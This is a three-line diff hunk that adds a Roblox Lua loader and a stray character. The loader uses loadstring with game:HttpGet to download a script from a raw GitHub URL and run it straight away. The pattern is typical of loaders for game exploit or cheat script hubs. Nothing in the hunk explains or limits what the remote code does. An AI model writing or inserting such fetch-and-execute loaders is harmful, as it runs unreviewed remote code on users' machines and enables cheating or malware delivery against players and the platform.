@@ -1,0 +1,3 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/xandudiscord/VESTRA/main/VESTRA'))()
+
+w
